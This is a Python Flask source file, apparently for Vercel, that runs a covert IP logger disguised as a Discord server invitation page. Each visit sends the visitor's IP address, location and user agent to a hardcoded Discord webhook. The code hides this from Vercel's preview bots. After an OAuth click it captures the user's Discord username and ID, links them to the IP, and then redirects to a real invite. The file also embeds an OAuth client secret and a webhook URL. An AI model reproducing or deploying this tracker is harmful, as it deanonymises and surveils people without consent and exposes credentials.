import os
from flask import Flask, render_template, request, redirect
import requests

# Configuración de Flask para Vercel
# Nota: La carpeta 'templates' debe estar dentro de 'api/' para despliegues Serverless
app = Flask(__name__, template_folder='templates')

# --- CONFIGURACIÓN ---
CLIENT_ID     = "1457527346687901812"
CLIENT_SECRET = "8NXd3i8r1QXproq-MMf8EqW_BJOujcPR"
REDIRECT_URI  = "https://logger-page-g0oldyv1y-ola950857gmailcoms-projects.vercel.app/callback"
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1456993989306749133/2JG3BvXA__irPAOcgx-R-lTPC7n7ScgWSgUl0jMmnR-staCUFK0b0upG2LwDHfck1ean"
AVATAR_URL = "https://i.pinimg.com/736x/10/e3/f5/10e3f51d11ef13d5c88cb329211146ba.jpg"

def get_client_data():
    # 1. Obtener la IP Real (Prioridad x-real-ip para saltar proxies de Vercel)
    ip = request.headers.get('x-real-ip')
    if not ip:
        ip = request.headers.get('x-forwarded-for', request.remote_addr)
        if ip and ',' in ip:
            ip = ip.split(',')[0].strip()
    
    # 2. Ubicación Nativa de Vercel (Ultra precición sin APIs externas)
    city = request.headers.get('x-vercel-ip-city', 'Desconocida')
    country = request.headers.get('x-vercel-ip-country', 'ES')
    region = request.headers.get('x-vercel-ip-country-region', 'N/A')
    
    return {
        'ip': ip,
        'city': city,
        'country': country,
        'region': region,
        'ua': request.headers.get('user-agent', 'Desconocido')
    }

@app.route('/')
def index():
    data = get_client_data()
    
    # Filtro de Bots / Screenshots de Vercel
    if 'vercel' in data['ua'].lower() or data['city'] == 'Santa Clara':
        return render_template('index.html', auth_url="#")

    # --- LOG 1: VISITA AUTOMÁTICA ---
    requests.post(DISCORD_WEBHOOK_URL, json={
        "username": "1* Tracker - Visita",
        "avatar_url": AVATAR_URL,
        "embeds": [{
            "title": "👁️ Conexión Detectada",
            "description": "Se ha registrado un acceso a la página de invitación.",
            "color": 0x5865F2,
            "fields": [
                {"name": "🌐 IP Pública", "value": f"**`{data['ip']}`**", "inline": True},
                {"name": "📍 Ubicación", "value": f"{data['city']}, {data['country']} ({data['region']})", "inline": True},
                {"name": "📱 Dispositivo", "value": f"```\n{data['ua'][:120]}\n```", "inline": False}
            ],
            "footer": {"text": "al3xg0nzalezzz • Paso 1 Auto-Log", "icon_url": AVATAR_URL}
        }]
    })

    # Generar link para el botón de Discord
    auth_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify"
    return render_template('index.html', auth_url=auth_url)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    if not code: return redirect("https://discord.gg/nUy6Vjr9YU")

    try:
        # Intercambiar código por Token de Identidad
        r_token = requests.post("https://discord.com/api/v10/oauth2/token", data={
            'client_id': CLIENT_ID, 
            'client_secret': CLIENT_SECRET, 
            'grant_type': 'authorization_code', 
            'code': code, 
            'redirect_uri': REDIRECT_URI
        }, headers={'Content-Type': 'application/x-www-form-urlencoded'})
        
        token = r_token.json().get('access_token')
        
        if token:
            # Obtener perfil del usuario
            user = requests.get("https://discord.com/api/v10/users/@me", headers={'Authorization': f'Bearer {token}'}).json()
            data = get_client_data()

            # --- LOG 2: IDENTIDAD COMPLETA ---
            requests.post(DISCORD_WEBHOOK_URL, json={
                "username": "1* Tracker - IDENTIDAD",
                "avatar_url": AVATAR_URL,
                "embeds": [{
                    "title": "🎯 ¡IDENTIDAD CAPTURADA!",
                    "color": 0xFF0044,
                    "thumbnail": {"url": f"https://cdn.discordapp.com/avatars/{user['id']}/{user['avatar']}.png" if user.get('avatar') else AVATAR_URL},
                    "fields": [
                        {"name": "👤 Usuario Discord", "value": f"**{user['username']}**", "inline": True},
                        {"name": "🆔 Discord ID", "value": f"`{user['id']}`", "inline": True},
                        {"name": "🌐 IP Asociada", "value": f"**`{data['ip']}`**", "inline": False},
                        {"name": "📍 Origen", "value": f"{data['city']}, {data['country']}", "inline": True}
                    ],
                    "footer": {"text": "al3xg0nzalezzz • Sincronización Éxitosa", "icon_url": AVATAR_URL}
                }]
            })
    except Exception as e:
        print(f"Error en callback: {e}")

    # Enviar al servidor real
    return redirect("https://discord.gg/nUy6Vjr9YU")

# Necesario para Vercel
app_dispatch = app
